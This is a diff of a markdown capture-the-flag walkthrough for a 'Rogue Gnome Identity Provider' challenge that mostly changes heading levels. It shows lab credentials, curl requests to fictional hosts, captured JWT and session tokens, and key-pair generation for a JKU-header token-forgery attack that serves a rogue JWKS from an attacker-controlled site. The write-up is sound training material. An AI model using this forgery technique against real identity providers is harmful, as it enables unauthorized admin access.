@@ -38,47 +38,47 @@ The challenge console mentions a file named ~/notes. </br>
 ![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_1.png)
 
 
-## Details in the file named ~/notes
+### Details in the file named ~/notes
 ??? tip "Notes"
-    ## Captured Gnome:
+    **Captured Gnome**
     curl http://gnome-48371.atnascorp/
 
-    ## ATNAS Identity Provider (IdP):
+    **ATNAS Identity Provider (IdP):**
     curl http://idp.atnascorp/
 
-    ## My CyberChef website:
+    **My CyberChef website:**
     curl http://paulweb.neighborhood/
     ### My CyberChef site html files:
     ~/www/
 
 
-    # Credentials
+    **Credentials**
 
-    ## Gnome credentials (found on a post-it):
+    **Gnome credentials (found on a post-it):**
     Gnome:SittingOnAShelf
 
 
-    # Curl Commands Used in Analysis of Gnome:
+    **Curl Commands Used in Analysis of Gnome:**
 
-    ## Gnome Diagnostic Interface authentication required page:
+    **Gnome Diagnostic Interface authentication required page:**
     curl http://gnome-48371.atnascorp
 
-    ## Request IDP Login Page
+    **Request IDP Login Page**
     curl http://idp.atnascorp/?return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth
 
-    ## Authenticate to IDP
+    **Authenticate to IDP**
     curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
 
-    ## Pass Auth Token to Gnome
+    **Pass Auth Token to Gnome**
     curl -v http://gnome-48371.atnascorp/auth?token=<insert-JWT>
 
-    ## Access Gnome Diagnostic Interface
+    **Access Gnome Diagnostic Interface**
     curl -H 'Cookie: session=<insert-session>' http://gnome-48371.atnascorp/diagnostic-interface
 
-    ## Analyze the JWT
+    **Analyze the JWT**
     jwt_tool.py <insert-JWT>
 
-## High level steps
+### High level steps
 We follow the below steps in the below order : <br/>
 
  - In the challenge
@@ -92,7 +92,7 @@ We follow the below steps in the below order : <br/>
     - Use JWT to generate the session id for admin user
     - Use session id to authenticate as admin
 
-### Authenticate and get the JWT token
+#### Authenticate and get the JWT token
 
 ```
 curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=http%3A%2F%2Fgnome-48371.atnascorp%2Fauth' http://idp.atnascorp/login
@@ -104,7 +104,7 @@ curl -X POST --data-binary $'username=gnome&password=SittingOnAShelf&return_uri=
 eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTQyNjgyNCwiZXhwIjoxNzY1NDM0MDI0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.JqykARKZRSm4TcWPaHfesn55Ew9mQy_nw3ysKO8sZmpGch5VqfkiD5FGH85p2pPP-cZ4Q6PAgBxjL_JJ7FSBrrA896uZAnehx86IowY9pyuSJ-aDDtG6Gu_ChpWlCm809hb8_66L6pwss4qCHfwIclhEYJ9Di0V9binaTQNDVys8txL_HPIF2-lHx2y8sKw3i5w1Hl-1fUhglzUSrFGIk2oTHduucRFU-IwalkrX192Ya2c_U-vgTYSnASUzCu8LNzgZiKSpvYLiFoaScLya8hbvW051SnpGTrOmu34M1U1dK6tUqlvnSFUpDObw-bvK2fl7tn0CmRr0xfuhHaR6jQ
 ```
 
-### Pass Auth Token to Gnome
+#### Pass Auth Token to Gnome
 ```
 curl -v http://gnome-48371.atnascorp/auth?token=eyJhbGciOiJSUzI1NiIsImprdSI6Imh0dHA6Ly9pZHAuYXRuYXNjb3JwLy53ZWxsLWtub3duL2p3a3MuanNvbiIsImtpZCI6ImlkcC1rZXktMjAyNSIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJnbm9tZSIsImlhdCI6MTc2NTQyNjgyNCwiZXhwIjoxNzY1NDM0MDI0LCJpc3MiOiJodHRwOi8vaWRwLmF0bmFzY29ycC8iLCJhZG1pbiI6ZmFsc2V9.JqykARKZRSm4TcWPaHfesn55Ew9mQy_nw3ysKO8sZmpGch5VqfkiD5FGH85p2pPP-cZ4Q6PAgBxjL_JJ7FSBrrA896uZAnehx86IowY9pyuSJ-aDDtG6Gu_ChpWlCm809hb8_66L6pwss4qCHfwIclhEYJ9Di0V9binaTQNDVys8txL_HPIF2-lHx2y8sKw3i5w1Hl-1fUhglzUSrFGIk2oTHduucRFU-IwalkrX192Ya2c_U-vgTYSnASUzCu8LNzgZiKSpvYLiFoaScLya8hbvW051SnpGTrOmu34M1U1dK6tUqlvnSFUpDObw-bvK2fl7tn0CmRr0xfuhHaR6jQ
 ```
@@ -122,7 +122,7 @@ curl -H 'Cookie: session=eyJhZG1pbiI6ZmFsc2UsInVzZXJuYW1lIjoiZ25vbWUifQ.aTpHxg.w
 
 So - question is how we can get a authenticate to the gnome-48371.atnascorp to get an admin session which we can use to access teh diagnostic interface?
 
-### Creating the private and public key pair
+#### Creating the private and public key pair
 ```
 openssl genpkey -algorithm RSA -out private.pem -pkeyopt rsa_keygen_bits:2048
 openssl rsa -in private.pem -pubout -out public.pem
@@ -132,7 +132,7 @@ openssl rsa -in private.pem -pubout -out public.pem
 Public and private key pair is created. <br/>
 ![Rogue_Gnome_Identity_Provider](../img/objectives/Rogue_Gnome_Identity_Provider/Rogue_Gnome_Identity_Provider_6.png)
 
-### Generate jwks payload - create_jwks.py
+#### Generate jwks payload - create_jwks.py
 We generate the JWKS content using the public cert.<br/>
 This is the content we can host and serve from http://paulweb.neighborhood/<br/>
 
